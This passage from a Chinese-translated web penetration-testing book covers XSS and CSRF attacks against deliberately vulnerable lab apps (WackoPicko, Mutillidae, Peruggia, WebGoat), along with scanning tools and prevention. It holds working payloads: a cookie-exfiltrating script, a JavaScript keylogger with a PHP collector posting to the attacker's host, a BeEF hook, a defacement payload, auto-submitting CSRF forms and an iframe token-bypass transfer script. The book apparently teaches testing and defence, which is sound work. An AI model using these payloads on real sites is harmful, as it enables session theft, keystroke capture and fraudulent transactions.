为了收集会话 cookie，攻击者需要运行一个 Web 服务器，并监听被注入应用程序发送的请求。在最基本的情况下，可以使用从基本的 Python HTTP 服务器到运行接收和存储 ID 甚至使用它们自动执行进一步攻击的正确的 Apache 或 nginx 服务器。为了演示起见，我们将使用基本的 Python 服务器。在 Kali Linux 的终端会话中执行以下命令以在端口`8000`上运行服务器：

```
python -m SimpleHttpServer 8000  
```

一旦服务器运行起来，你将在 OWASP BWA 虚拟机中的 WackoPicko Web 应用程序中利用一个持久性 XSS 漏洞。在 Kali Linux 中浏览到 WackoPicko，在 Guestbook 表单中提交以下代码的评论：

```
<script>document.write('<img src="img/'+document.cookie+' ">');</script> 
```

注意`127.0.0.1`是 Kali Linux 的本地 IP 地址。它应该被设置为接收 cookie 的服务器的地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00174.jpeg)

每次加载 Guestbook 页面时，它都会执行脚本并尝试从外部服务器获取图像。用于获取此类图像的请求在 URL 中包含会话 cookie，这将被记录在接收服务器上，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00175.jpeg)

# 篡改网站

使用 XSS 来篡改网站（改变其视觉外观）并不是一种非常常见的攻击。尽管如此，它是可以做到的，特别是对于持久性漏洞，它可以给一个网站被篡改的公司带来严重的声誉损害，即使服务器的文件没有发生任何改变。

你可以用 JavaScript 以多种方式改变网站的外观。例如，插入 HTML 元素如`div`或`iframe`，替换样式值，改变图像源，以及许多其他技术都可以改变网站的外观。你还可以使用文档的`body`的`innerHTML`属性来替换整个页面的 HTML 代码。

Mutillidae II 有一个 DOM XSS 测试表单，可以帮助我们测试这个漏洞。在菜单中，转到 OWASP 2013 | A3 - 跨站脚本攻击（XSS）| DOM 注入 | HTML5 存储。这个演示应用程序将信息保存到浏览器的 HTML5 存储中，并且它包含许多漏洞。在这里，我们将重点关注当一个元素被添加到存储中时，它会反映出键的事实，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00176.jpeg)

该表单有一定程度的过滤，因为`script`标签不会被反映出来：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00177.jpeg)

经过一些不同注入字符串的试验和错误，你会发现一个带有不存在源（例如，`src`参数）的`img`标签是有效的：

```
<img src=x onerror="document.body.innerHTML='<h1>Defaced with XSS</h1>'"> 
```

将该代码设置为新元素的键，并点击“添加新元素”将显示如下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00178.jpeg)

如前所述，这样的攻击不会改变 Web 服务器上的文件，只有运行恶意脚本的用户才能注意到这些变化。当利用持久性 XSS 时，篡改可能会影响大量用户，因为攻击者不需要逐个地针对每个受害者，这与反射型和基于 DOM 的 XSS 不同。无论哪种方式，这可能会导致用户将敏感信息提供给攻击者，同时认为他们正在提交给一个合法的网站。

# 键盘记录器

利用 XSS 收集用户敏感信息的另一种方法是将浏览器转变为一个键盘记录器，捕获每个按键并将其发送到攻击者控制的服务器。这些按键可能包含用户在页面中输入的敏感信息，如姓名、地址、密码、秘密问题和答案、信用卡信息等，具体取决于受攻击页面的目的。

我们将使用预先安装在 Kali Linux 中的 Apache Web 服务器，以便将按键存储在文件中，以便我们在利用 XSS 后可以检查受攻击应用程序发送的按键。服务器将有两个文件：`klog.php`和`klog.js`。

这是`klog.php`文件的外观：

```
<?php 
  if(!empty($_GET['k'])) { 
    $file = fopen('keys.txt', 'a'); 
    fwrite($file, $_GET['k']); 
    fclose($file); 
  } 
?> 
```

这是`klog.js`文件的外观：

```
var buffer = []; 
var server = 'http://10.7.7.4/klog.php?k=' 
document.onkeypress = function(e) { 
  buffer.push(e.key); 
} 
window.setInterval(function() { 
  if (buffer.length > 0) { 
    var data = encodeURIComponent(buffer); 
    new Image().src = server + data; 
    buffer = []; 
  } 
}, 200); 
```

在这里，`10.7.7.4`是 Kali Linux 机器的地址，所以受害者将把缓冲区发送到该服务器。此外，根据系统的配置，您可能需要在代码中指定的路径中创建`keys.txt`文件。在这个例子中，它是 Web 根目录(`/var/www/html/`)。此外，添加写权限或将所有权设置为 Apache 的用户，以防止 Web 服务器在尝试更新本地文件时出现权限错误：

```
touch /var/www/html/keys.txt
chown www-data /var/www/html/keys.txt
```

这是键盘记录器的最简单版本。更复杂的版本可能包括以下内容：

+   捕获的时间戳

+   发送信息的用户或机器的标识符

+   将键保存到数据库以便查询、分组和排序

+   控制功能，如启动和停止键盘记录器，触发特定键或组合的操作

在渗透测试期间，应尽量避免从客户端或用户中捕获信息，尽管有时为了正确覆盖某些攻击向量是必要的。如果是这种情况，必须采取适当的安全措施来传输、存储和处理这些信息。如果任何信息被发送到渗透测试人员控制的服务器，通信必须使用 HTTPS、SSH 或其他安全协议进行加密。存储也必须进行加密。建议使用全盘加密，但还需要在其上进行数据库和文件加密。此外，根据约定规则，可能需要安全擦除所有信息。

再次使用 WackoPicko 的留言板，提交以下评论：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00179.jpeg)

这将在每次用户访问留言板页面时加载外部 JavaScript 文件，并捕获他们发出的所有按键。现在您可以在页面中键入任何内容，它将被发送到您的服务器。

如果您想查看到目前为止记录的内容，只需查看 Kali Linux 中的`keys.txt`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00180.jpeg)

您可以看到，由于键在客户端缓冲并定期发送，所以有一些由逗号分隔的不同长度的组，并且非可打印键以名称的形式写入：`ArrowLeft`，`ArrowRight`，`Backspace`，`Home`，`End`等等。

# 利用 BeEF-XSS 控制用户的浏览器

一种被称为**浏览器中间人**（**MITB**）的攻击使用 JavaScript 将用户的浏览器连接到一个**命令和控制**（**C2**）服务器，该服务器使用脚本向浏览器发出指令并从中收集信息。XSS 可以用作载体，使用户在访问易受攻击的应用程序时加载这样的脚本。攻击者可以执行的操作包括：

+   读取按键

+   提取浏览器中保存的密码

+   读取 cookie 和 HTML5 存储

+   启用麦克风和摄像头（可能需要用户交互）

+   利用浏览器漏洞

+   使用浏览器作为进入组织内部网络的枢纽

+   控制浏览器标签和窗口的行为

+   安装恶意浏览器扩展

Kali Linux 包含**浏览器利用框架**（**BeEF**），它是一个设置了托管 C2 中心的 Web 服务器以及在 MITB 攻击中由受害者调用的钩子代码的工具。

接下来，我们将演示攻击者如何使用 XSS 来让客户端（用户的浏览器）调用那个钩子文件，以及如何使用它在这样的浏览器上远程执行操作：

1.  首先，您需要在 Kali Linux 中启动`beef-xss`服务。可以通过应用程序菜单完成：应用程序 | 13 - 社会工程学工具 | beef xss framework，或通过终端执行以下命令：

```
      beef-xss
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00181.jpeg)

如果服务正确启动，您应该能够浏览到控制面板。默认情况下，BeEF 运行在端口`3000`上，所以浏览到[`http://127.0.0.1:3000/ui/panel`](http://127.0.0.1:3000/ui/panel)并使用默认的用户名和密码`beef`/`beef`登录，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00182.jpeg)

1.  攻击者的下一步将是利用持久性 XSS 或诱使用户点击指向恶意站点或易受 XSS 攻击的站点的链接。

现在，作为受害者，转到 Mutillidae（OWASP 2013 | A3 - 跨站脚本（XSS） | 反射（一级） | DNS 查找）并在主机名/IP 文本框中提交以下内容：

```
      <script src="img/hook.js"></script> 
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00183.jpeg)

1.  再次，`10.7.7.4`是运行 BeEF 的服务器的地址。在这种情况下，是您的 Kali Linux 机器。您可以看到结果似乎是空的，但如果您浏览到 BeEF 控制面板，您将看到您有一个新的浏览器连接。在详细信息选项卡中，您可以看到有关此浏览器的所有信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00184.jpeg)

1.  如果您转到当前浏览器的日志选项卡，您将看到钩子记录用户在浏览器中的所有操作，从点击和按键到窗口或标签的更改：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00185.jpeg)

1.  在命令选项卡中，您可以向受害者浏览器发出命令。例如，在下面的截图中，请求了一个 cookie：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00186.jpeg)

# 扫描 XSS 漏洞

有了数百种可能的有效载荷变体，并且是 Web 应用程序中最常见的漏洞之一，XSS 有时很难找到，或者如果找到了，很难生成一个令客户团队投入时间和精力来修复它的令人信服的概念验证利用。此外，具有数百或数千个输入参数的大型应用程序几乎不可能在时间限制的测试中完全覆盖。

因此，您可能需要使用自动化工具来加快生成结果的速度，即使可能会牺牲一定程度的准确性，并增加触发应用程序中某些服务中断的风险。有许多 Web 漏洞扫描器，免费和付费都有，具有各种不同的准确性、稳定性和安全性。现在我们将回顾一些已被证明高效可靠的 XSS 漏洞专用扫描器。

# XSSer

**跨站“脚本者”**（**XSSer**）是一个自动化框架，旨在检测、利用和报告基于 Web 的应用程序中的 XSS 漏洞。它包含在 Kali Linux 中。

XSSer 可以检测持久性、反射性和基于 DOM 的 XSS，扫描指定的 URL 或根据给定的查询在 Google 上搜索潜在目标，通过不同的机制进行身份验证，并执行许多其他任务。

让我们尝试使用 BodgeIt 的搜索请求作为目标进行简单的扫描。为此，请在 Kali Linux 的终端中发出以下命令：

```
xsser -u http://10.7.7.5/bodgeit/search.jsp -g ?q=  
```

在这里，XSSer 在由`-u`参数指示的 URL 上运行，并使用`GET`方法和`q`（`-g ?q=`）参数进行扫描。这意味着扫描器将其有效负载附加到`-g`之后指定的字符串，并将其结果附加到 URL 上，因为它使用`GET`。运行命令后，您将看到结果表明测试的 URL 易受 XSS 攻击：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00187.jpeg)

还可以使用以下命令使用 GUI：

```
xsser -gtk
```

这是 GUI 的外观：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00188.jpeg)

# XSS-Sniper

XSS-Sniper 不包含在 Kali Linux 中，但绝对值得一试。这是 Gianluca Brindisi 的一个开源工具，可以搜索 XSS 漏洞，包括特定 URL 中的基于 DOM 的 XSS，或者可以爬行整个站点。虽然不像 XSSer 那样功能丰富，但在 XSSer 不可用或验证结果时，它是一个不错的选择。

XSS-Sniper 可以从其 GitHub 存储库下载：

```
git clone https://github.com/gbrindisi/xsssniper.git
```

要对`GET`请求进行基本扫描，只需使用`-u`参数后跟完整的 URL，包括测试值：

```
python xsssniper.py -u http://10.7.7.5/bodgeit/search.jsp?q=test
```

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00189.jpeg)

Burp Suite Professional 和 OWASP ZAP 包括可以准确检测到许多 XSS 实例的漏洞扫描功能。还可以使用 W3af、Skipfish 和 Wapiti 等扫描器。

# 预防和减轻跨站脚本攻击

与任何其他注入漏洞一样，适当的输入验证是防止 XSS 的第一道防线。此外，如果可能的话，避免使用用户输入作为输出信息。清理和编码是防止 XSS 的关键方面。

**清理**意味着从字符串中删除不可接受的字符。当输入字符串中不应存在特殊字符时，这很有用。

编码将特殊字符转换为其 HTML 代码表示。例如，`&`转换为`&amp;`或`<`转换为`&lt;`。某些类型的应用程序可能需要允许在输入字符串中使用特殊字符。对于这些应用程序，清理是不可选的。因此，它们应该在将输出数据插入页面和存储在数据库中之前对其进行编码。

验证、清理和编码过程必须在客户端和服务器端都进行，以防止所有类型的 XSS 和其他代码注入。

有关预防跨站脚本攻击的更多信息，请访问以下网址：

+   [`www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)

+   [`docs.microsoft.com/en-us/aspnet/core/security/cross-site-scripting`](https://docs.microsoft.com/en-us/aspnet/core/security/cross-site-scripting)

+   [`www.acunetix.com/blog/articles/preventing-xss-attacks/`](https://www.acunetix.com/blog/articles/preventing-xss-attacks/)

# 摘要

在本章中，我们详细讨论了 XSS 漏洞。我们首先看了漏洞的起源以及它在多年来的演变过程中如何发展。然后，您了解了不同形式的 XSS 及其攻击潜力。我们还分析了攻击者如何利用不同的 JavaScript 功能在受害者的浏览器中执行各种操作，例如窃取会话 cookie、记录按键、篡改网站和远程控制 Web 浏览器。Kali Linux 有几个工具可以测试和利用 XSS 漏洞。我们使用 XSSer 和 XSS-Sniper 来检测 Web 应用程序中的漏洞。在最后一节中，我们回顾了应采取的一般措施，以防止或修复 Web 应用程序中的 XSS 漏洞。

在下一章中，我们将描述跨站请求伪造，并展示如何利用它来欺骗已验证用户执行不希望的操作，同时还提供了如何预防此类缺陷的建议。


# 第七章：跨站请求伪造（CSRF），识别和利用

**跨站请求伪造**（**CSRF**）经常被错误地视为与 XSS 类似的漏洞。XSS 利用用户对特定站点的信任，使用户相信网站呈现的任何信息。另一方面，CSRF 利用网站对用户浏览器的信任，使网站在未验证用户是否要执行特定操作的情况下执行来自经过身份验证的会话的任何请求。

在 CSRF 攻击中，攻击者使经过身份验证的用户在其经过身份验证的 Web 应用程序中执行不需要的操作。这是通过用户访问的外部站点触发这些操作来实现的。

如果未实施足够的防御措施，CSRF 可以利用需要在经过身份验证的会话中进行的每个 Web 应用程序功能。以下是攻击者可以通过 CSRF 攻击执行的一些操作的示例：

+   在 Web 应用程序中更改用户详细信息，例如电子邮件地址和出生日期

+   进行欺诈性的银行交易

+   在网站上进行欺诈性的点赞和点踩

+   在电子商务网站上添加商品到购物车或在用户不知情的情况下购买商品

+   CSRF 攻击的先决条件

由于 CSRF 利用了经过身份验证的会话，受害者必须在目标 Web 应用程序中拥有活动的经过身份验证的会话。该应用程序还应允许在会话中进行交易而无需重新进行身份验证。

CSRF 是一种盲目攻击，目标 Web 应用程序的响应不会发送给攻击者，而是发送给受害者。攻击者必须了解触发所需操作的网站参数。例如，如果您想在网站上更改受害者的注册电子邮件地址，作为攻击者，您需要确定需要操纵以进行此更改的确切参数。因此，攻击者需要对 Web 应用程序有适当的理解，这可以通过直接与其交互来实现。

此外，攻击者需要找到一种方法来诱使用户点击预先构建的 URL，或者如果目标应用程序使用`POST`方法，则访问受攻击者控制的网站。这可以通过社交工程攻击来实现。

# 测试 CSRF 漏洞

CSRF 漏洞的描述明确表明它是一种业务逻辑缺陷。有经验的开发人员会创建 Web 应用程序，始终在执行关键任务（如更改密码、更新个人详细信息或在金融应用程序（如在线银行账户）中做出关键决策时）包括用户确认屏幕。测试业务逻辑缺陷不是自动化 Web 应用程序扫描器的工作，因为它们使用预定义规则。例如，大多数自动化扫描器会测试以下项目以确认 URL 中是否存在 CSRF 漏洞：

+   检查请求和响应中常见的反 CSRF 令牌名称

+   尝试确定应用程序是否通过提供虚假引用者来检查引用者字段

+   创建变异体以检查应用程序是否正确验证令牌值

+   检查查询字符串中的令牌和可编辑参数

大多数自动化应用程序扫描器使用的先前方法容易产生误报和漏报。应用程序将使用完全不同的缓解技术来防御 CSRF 攻击，从而使这些扫描工具无效。

分析应用程序中的 CSRF 漏洞的最佳方法是首先完全了解 Web 应用程序的功能。启动代理，如 Burp 或 ZAP，并捕获流量以分析请求和响应。然后，您可以创建一个 HTML 页面，复制从代理中识别出的易受攻击的代码。测试 CSRF 漏洞的最佳方法是手动进行。

如果应用程序在通过经过身份验证的用户会话执行服务器端更改时没有包含任何特殊的头部或表单参数，那么它很可能容易受到 CSRF 漏洞的攻击。例如，下面的屏幕截图显示了对**Peruggia**中的图片添加评论的请求，该应用程序是**OWASP BWA**虚拟机中的一个易受攻击的应用程序。您会注意到在服务器端没有特殊的头部可以识别一个请求与另一个请求的区别。此外，`GET`和`POST`参数用于标识要执行的操作、受影响的图像以及评论的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00190.jpeg)

有时，应用程序使用验证令牌，但其实现是不安全的。下面的屏幕截图显示了使用安全级别 1 的 Mutillidae II | OWASP 2013 | A8 - 跨站请求伪造（CSRF）| 注册用户的请求。您可以看到请求中有一个`csrf_token`参数用于注册新用户。然而，它只有四位数，并且似乎很容易预测。实际上，在这种特殊情况下，令牌的值始终相同：`7777`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00191.jpeg)

其他实现 CSRF 防护令牌的错误示例包括：

+   将令牌作为 cookie 包含：浏览器会自动在请求中发送与访问的站点对应的 cookie，这将使本来安全的令牌实现变得无效。

+   使用用户或客户端信息作为令牌：IP 地址、用户名或个人信息等信息可以用作令牌。这样做会不必要地暴露用户信息，并且可以通过社会工程学或有针对性的攻击中的开源情报（OSINT）收集此类信息。

+   **允许重复使用令牌**：即使只允许短时间内重复使用令牌，仍然可以进行攻击。

+   仅客户端检查：如果应用程序仅使用客户端代码验证用户是否实际执行某些操作，攻击者仍然可以使用 JavaScript 绕过这些检查，无论是通过 XSS 利用还是在攻击页面中，或者仅仅是重放最终请求。

# 利用 CSRF 漏洞

通过`GET`请求（参数在 URL 中发送）利用此漏洞就像说服用户浏览到执行所需操作的恶意链接一样简单。另一方面，要利用`POST`请求中的 CSRF 漏洞，需要创建一个包含表单或脚本的 HTML 页面来提交请求。

# 利用 POST 请求中的 CSRF 漏洞

在本节中，我们将重点介绍利用`POST`请求的漏洞。我们将使用 Peruggia 的用户创建功能进行练习。第一步是了解要复制的请求的工作原理；如果您以管理员身份登录 Peruggia 并在使用 Burp Suite 捕获流量时创建一个新用户，您会发现请求如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00192.jpeg)

请求只包括`newuser`（用户名）和`newuserpass`（密码）参数。因此，一旦确定了进行更改的请求和参数，我们需要执行以下操作：

1.  创建一个生成带有这些参数和要使用的信息的请求的 HTML 页面。

1.  说服用户浏览到您的页面并提交请求。后者可能是不必要的，因为您可以让页面自动提交表单。

需要一个复杂的 HTML 页面来实现我们的目标。在这个例子中，易受攻击的服务器是`10.7.7.5`：

```
<HTML> 
  <body> 
    <form method="POST" action="http://10.7.7.5/peruggia/index.php?action=account&adduser=1"> 
      <input type="text" value="CSRFuser" name="newuser"> 
      <input type="text" value="password123!" name="newuserpass"> 
      <input type="submit" value="Submit"> 
    </form> 
  </body> 
</HTML> 
```

生成的页面将如下屏幕截图所示。底部部分是 Firefox 开发者工具面板，可以使用*F12*键激活：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00193.jpeg)

在常规渗透测试中，这可能作为**概念验证**（**PoC**）有效，并足以证明存在漏洞。更复杂的版本可以包含欺骗性内容和脚本代码，以在页面加载后自动提交请求：

```
<HTML> 
  <BODY> 
    ... 
    <!-- include attractive HTML content here --> 
    ... 
    <FORM id="csrf" method="POST" action="http://10.7.7.5/peruggia/index.php?action=account&adduser=1"> 
      <input type="text" value="CSRFuser" name="newuser"> 
      <input type="text" value="password123!" name="newuserpass"> 
      <input type="submit" value="Submit"> 
    </FORM> 
    <SCRIPT>document.getElementById("csrf").submit();</SCRIPT> 
  </BODY> 
</HTML> 
```

要测试此 PoC 页面，请打开 Peruggia 并使用`admin`用户（密码：`admin`）启动会话，并在同一浏览器的不同标签页或窗口中加载攻击页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00194.jpeg)

接下来，点击提交按钮或者如果使用脚本版本，则只需加载页面，服务器将处理该请求，就好像它是由经过身份验证的用户发送的一样。使用浏览器的开发者工具，您可以检查请求是否已发送到目标服务器并得到正确处理。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00195.jpeg)

# Web 服务上的 CSRF

如今的 Web 应用程序通常使用对 Web 服务的调用来执行任务，而不是使用普通的 HTML 表单。这些请求通过 JavaScript 使用 XMLHttpRequest 对象完成，该对象允许开发人员创建 HTTP 请求并自定义方法、头部和主体等参数。

Web 服务通常接收与标准 HTML 表单不同格式的请求（例如，`parameter1=value1&parameter2=value2`），例如 JSON 和 XML。以下示例代码片段以 JSON 格式发送地址更新请求：

```
var xhr = new XMLHttpRequest(); 
xhr.open('POST', '/UpdateAddress'); 
xhr.setRequestHeader('Content-Type', 'application/json'); 
xhr.onreadystatechange = function () { 
  if (xhr.readyState == 4 && xhr.status == 200) { 
    alert(xhr.responseText); 
  } 
} 
xhr.send(JSON.stringify(addressData)); 
```

此请求的主体（即`POST`数据）可能如下所示：

```
{"street_1":"First street","street_2":"apartment 2","zip":54123,"city":"Sin City"} 
```

如果您尝试将此精确字符串作为 HTML 表单中的`POST`参数发送，服务器将出现错误，并且您的请求将无法处理。例如，提交以下表单将无法正确处理参数：

```
<HTML> 
  <BODY> 
    <FORM method="POST" action="http://vulnerable.server/UpdateAddress"> 
      <INPUT type="text" name='{
                           "street_1":"First street",
                           "street_2":"apartment 2",
                           "zip":54123,"city":"Sin City"}' value=""> 
      <INPUT type="submit" value="Submit"> 
    </FORM> 
  </BODY> 
</HTML> 
```

有几种方法可以利用 CSRF 对使用 JSON 或 XML 格式的请求进行攻击。

通常，Web 服务允许以不同格式传递参数，包括 HTML 表单格式；因此，您的第一个选择是将请求的`Content-Type`头更改为`application/x-www-form-urlencoded`。只需通过 HTML 表单发送请求即可实现此目的。但是，您不需要尝试发送 JSON 字符串；相反，您可以创建一个包含字符串中每个参数的输入的表单。在我们的示例中，HTML 代码的简单版本如下所示：

```
<HTML> 
  <BODY> 
    <FORM method="POST" action="http://vulnerable.server/UpdateAddress"> 
      <INPUT type="text" name="street_1" value="First street"> 
      <INPUT type="text" name="street_2" value="apartment 2"> 
      <INPUT type="text" name="zip" value="54123"> 
      <INPUT type="text" name="city" value="Sin City"> 
      <INPUT type="submit" name="submit" value="Submit form"> 
    </FORM> 
  </BODY> 
</HTML> 
```

如果请求的`Content-Type`头不被允许，而 Web 服务只接受 JSON 或 XML 格式，则需要复制（或创建）生成请求的脚本代码，按照相同的示例进行操作：

```
<HTML> 
  <BODY> 
    <SCRIPT> 
      function send_request() 
      { 
        var xhr = new XMLHttpRequest(); 
        xhr.open('POST', 'http://vulnerable.server/UpdateAddress'); 
        xhr.setRequestHeader('Content-Type', 'application/json'); 
        xhr.withCredentials=true; 
        xhr.send('{"street_1":"First street",
                  "street_2":"apartment 2","zip":54123,
                  "city":"Sin City"}'); 
      } 
    </SCRIPT> 
    <INPUT type="button" onclick="send_request()" value="Submit">  
  </BODY> 
</HTML> 
```

请注意使用了`xhr.withCredentials=true;`。这允许 JavaScript 获取浏览器中存储的目标域的 cookie，并将其与请求一起发送。此外，省略了状态更改事件处理程序，因为您不需要捕获响应。

这种最后的选择有几个缺点，因为当前浏览器和服务器在跨站操作方面对 JavaScript 的行为有限制。例如，根据服务器的**跨域资源共享**（**CORS**）配置，应用程序可能需要在发送跨站请求之前执行预检查。这意味着浏览器将自动发送一个`OPTIONS`请求，以检查该服务器允许的方法。如果请求的方法不允许进行跨域请求，浏览器将不会发送它。另一个保护的例子是浏览器中的**同源策略**，默认情况下，它使浏览器保护服务器的资源免受其他网站的脚本代码访问。

# 使用跨站脚本（XSS）绕过 CSRF 保护

当应用程序容易受到**跨站脚本**（**XSS**）攻击时，攻击者可以利用该漏洞（通过脚本代码）读取包含唯一令牌的变量，并将其发送到外部站点并在新标签中打开恶意页面，或者使用相同的脚本代码发送请求，同时绕过 CORS 和同源策略，因为请求将由同一站点通过本地脚本进行。

让我们看看使用脚本代码使应用程序执行自身请求的情况。您将使用 WebGoat 的*CSRF Token By-Pass*（跨站脚本（XSS）| CSRF Token By-Pass）练习。根据说明，您需要滥用新闻组中的*新帖子*功能允许注入 HTML 和 JavaScript 代码，以执行未经授权的转账请求。

以下屏幕截图显示了转账页面，您可以通过将`&transferFunds=main`参数添加到课程的 URL 中来加载它：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00196.jpeg)

如果您检查表单的源代码，您会看到它有一个名为`CSRFToken`的隐藏字段，每次加载页面时都会更改。这似乎是完全随机的：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00197.jpeg)

为了在这个表单中执行 CSRF 攻击，您需要利用评论表单中的 XSS 漏洞，使用 JavaScript 将转账表单加载到一个`iframe`标签中。这将设置值为 transfer 并自动提交表单。要做到这一点，请使用以下代码：

```
<script language="javascript"> 
  function frame_loaded(iframe) 
  { 
    var form =iframe.contentDocument.getElementsByTagName('Form')[1]; 
    form.transferFunds.value="54321"; 
    //form.submit(); 
  } 
</script> 

<iframe id="myframe" name="myframe" onload="frame_loaded(this)" 
  src="img/attack?Screen=2&menu=900&transferFunds=main"> 
</iframe> 
```

因此，当 iframe 中包含的页面完全加载完成时，它将调用`frame_loaded`函数，该函数将`transferFunds`字段的值设置为`54321`（要转移的金额）并提交请求。请注意，`form.submit();`行被注释掉了。这仅用于演示目的，以防止自动提交。

现在浏览到易受攻击的页面：

```
http://10.7.7.5/WebGoat/attack?Screen=2&menu=900
```

为您的帖子设置一个标题，在消息字段中编写或粘贴您的代码，然后提交它。

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00198.jpeg)

完成后，您将在页面底部看到您的消息标题，就在提交按钮下方。如果您像受害者一样点击它，您可以看到它如何加载在代码中设置的要转移的金额：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00199.jpeg)

要测试自动提交，请发布一条新消息，删除`form.submit();`行上的注释。打开消息的结果将类似于以下屏幕截图：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00200.jpeg)

下一个屏幕截图来自 Burp Suite 的代理历史记录，显示了浏览器在前面的示例中如何发出请求。首先显示的是加载带有注入代码的消息的请求，在我们的例子中是消息 66（参数`Num=66`）。接下来，恶意消息加载了包含资金转移页面的 iframe（参数`transferFunds=main`）。最后，根据代码，当此页面完成加载脚本代码时，它填写要转移的金额并使用有效的 CSRF 令牌提交请求：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00201.jpeg)

# 预防 CSRF 攻击

预防 CSRF 攻击的关键是确保经过身份验证的用户是请求操作的人。由于浏览器和 Web 应用程序的工作方式，最好的选择是使用令牌来验证操作，或者在可能的情况下使用验证码控件。

当易受攻击的参数通过`GET`方法传递时，执行 CSRF 攻击更容易。因此，首先避免使用它，并在可能的情况下使用`POST`方法。这并不能完全消除攻击，但可以增加攻击者的难度。

由于攻击者将尝试破解令牌生成或验证系统，因此安全地生成它们非常重要；也就是说，攻击者无法猜测它们。您还必须使它们对每个用户和每个操作都是唯一的，因为重用它们会使它们失去作用。这些令牌通常包含在每个请求的标头字段中，或者包含在 HTML 表单的隐藏输入中。避免将它们包含在 cookie 中，因为它们会随着每个请求在每个域的基础上由浏览器自动发送。

CAPTCHA 控件和重新认证在某些情况下对用户来说是侵入性和烦人的，但如果操作的重要性值得，他们可能愿意接受它们，以换取额外的安全级别。

此外，应该在服务器上配置 CORS 策略，因为它们可以防止通过 Web 浏览器的脚本代码进行的一些攻击。如果加载在该窗口中的 URL 不属于同一源（例如主机、端口或协议），CORS 策略将阻止在不同标签或浏览器窗口中运行的 JavaScript 访问数据/资源。

有关防止 CSRF 的更多信息，请访问[`www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)。

# 总结

在本章中，您了解了 CSRF 以及它如何滥用服务器和 Web 浏览器之间的信任关系。您了解了如何检测可能存在漏洞的应用程序，审查了一种利用过程，并通过一个示例进行了实践，分析了它在 Web 服务中的工作原理。您还了解了一种绕过令牌保护、CORS 和同源策略的方法，结合 XSS 漏洞使用。

与之前的章节一样，本章的最后一节是关于防御的。我们审查了在您自己的应用程序或客户的应用程序中预防或减轻 CSRF 漏洞的推荐方法。

下一章将简要介绍密码学，重点介绍渗透测试人员需要了解的基础知识，例如区分加密、哈希和编码，识别弱密码实现并利用常见漏洞。


# 第八章：攻击密码实现中的缺陷

信息安全的主要目标之一是保护数据的机密性。在 Web 应用程序中，目标是确保用户和应用程序之间交换的数据是安全的，并且对任何第三方隐藏。当存储在服务器上时，数据还需要免受黑客的攻击。**密码学**是通过和解密秘密书写或消息来保护数据的机密性和完整性的实践。

当前标准的密码算法由高度专业的数学家和计算机科学家组成的团队进行了设计、测试和修正。深入研究他们的工作超出了本书的范围；寻找这些算法固有的漏洞也不是本书的目标。相反，我们将重点关注这些算法的某些实现以及如何检测和利用实现失败，包括那些没有经过相同设计和测试水平的自定义实现。

攻击者将尝试找到不同的方法来破解加密层并暴露明文数据。他们使用不同的技术，例如利用加密协议中的设计缺陷或诱使用户通过非加密通道发送数据，绕过加密本身。作为渗透测试人员，您需要了解这些技术，并能够识别缺乏加密或有缺陷的实现，利用这些缺陷，并提出修复问题的建议。

在本章中，我们将分析密码学在 Web 应用程序中的工作原理，并探讨其实现中常见的一些问题。

# 密码学入门

首先，我们需要在谈论密码学时明确区分常常混淆的概念：加密、编码、混淆和哈希：

+   **加密**：这是通过数学算法来改变数据以使其对未经授权的方​​式不可理解的过程。授权方可以使用密钥将消息解密回明文。AES、DES、Blowfish 和 RSA 是众所周知的加密算法。

